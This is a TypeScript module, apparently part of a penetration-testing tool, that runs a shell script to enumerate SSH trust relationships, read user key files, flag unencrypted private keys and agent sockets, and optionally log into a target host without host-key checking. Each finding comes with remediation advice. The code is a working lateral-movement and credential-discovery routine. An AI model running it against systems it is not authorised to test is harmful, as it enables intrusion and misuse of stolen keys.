import { bash, sh, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function sshPivot(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== SSH Lateral Movement ==="]
  const target = argVal(args, "--target")
  const key = argVal(args, "--key")
  const user = argVal(args, "--user") || "root"

  const script = `
echo "--- Known Hosts (potential targets) ---"
for dir in /root /home/*; do
  if [ -f "$dir/.ssh/known_hosts" ]; then
    echo "[*] $dir/.ssh/known_hosts:"
    if command -v ssh-keygen >/dev/null 2>&1; then
      ssh-keygen -l -f "$dir/.ssh/known_hosts" 2>/dev/null | head -20
    else
      cat "$dir/.ssh/known_hosts" 2>/dev/null | awk '{print $1}' | head -20
    fi
  fi
done

echo ""
echo "--- Authorized Keys (trust relationships) ---"
for dir in /root /home/*; do
  if [ -f "$dir/.ssh/authorized_keys" ]; then
    count=$(wc -l < "$dir/.ssh/authorized_keys" 2>/dev/null)
    echo "[*] $dir/.ssh/authorized_keys: $count key(s)"
    awk '{print $3, $1}' "$dir/.ssh/authorized_keys" 2>/dev/null | head -10
  fi
done

echo ""
echo "--- SSH Config Targets ---"
for dir in /root /home/*; do
  if [ -f "$dir/.ssh/config" ]; then
    echo "[*] $dir/.ssh/config:"
    grep -iE "^(Host |HostName |User |IdentityFile |ProxyJump )" "$dir/.ssh/config" 2>/dev/null
  fi
done

echo ""
echo "--- Available Private Keys ---"
for dir in /root /home/*; do
  for kf in "$dir/.ssh/id_rsa" "$dir/.ssh/id_ecdsa" "$dir/.ssh/id_ed25519" "$dir/.ssh/id_dsa"; do
    if [ -f "$kf" ]; then
      enc=""
      grep -q "ENCRYPTED" "$kf" && enc="(encrypted)" || enc="(UNENCRYPTED)"
      echo "[+] $kf $enc"
    fi
  done
done

echo ""
echo "--- SSH Agent Sockets ---"
find /tmp -name "agent.*" -type s 2>/dev/null | head -5
[ -n "$SSH_AUTH_SOCK" ] && echo "[+] SSH_AUTH_SOCK=$SSH_AUTH_SOCK"
${target ? `
echo ""
echo "--- Attempting connection to ${target} ---"
ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no ${key ? `-i ${key}` : ""} ${user}@${target} "hostname; id; ip addr show 2>/dev/null | grep inet" 2>&1
` : ""}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const hosts = (r.stdout.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/g) || [])
  const uniqueHosts = [...new Set(hosts)]
  if (uniqueHosts.length > 0) {
    findings.push({
      checkId: "LNX-SSHPIVOT-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "ssh_targets",
      title: "SSH pivot targets identified",
      details: `${uniqueHosts.length} unique IP(s) found in known_hosts/config — potential lateral movement targets via SSH`,
      remediation: "Limit SSH trust relationships. Use bastion hosts with MFA. Rotate SSH keys regularly.",
    })
  }

  const unencKeys = (r.stdout.match(/UNENCRYPTED/g) || []).length
  if (unencKeys > 0) {
    findings.push({
      checkId: "LNX-SSHPIVOT-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "ssh_keys",
      title: "Unencrypted SSH keys available for pivoting",
      details: `${unencKeys} unencrypted private key(s) found — can be used directly for lateral movement without passphrase`,
      remediation: "Encrypt all SSH private keys with strong passphrases.",
    })
  }

  if (target && r.stdout.includes("hostname")) {
    findings.push({
      checkId: "LNX-SSHPIVOT-003",
      provider: "linuxhook",
      severity: "CRITICAL",
      status: "EXPLOITED",
      resource: target,
      title: `SSH pivot successful to ${target}`,
      details: `Successfully authenticated to ${target} as ${user} — lateral movement confirmed`,
      remediation: "Revoke compromised SSH keys. Implement network segmentation and SSH certificate authentication.",
    })
  }

  return { output: output.join("\n"), findings }
}
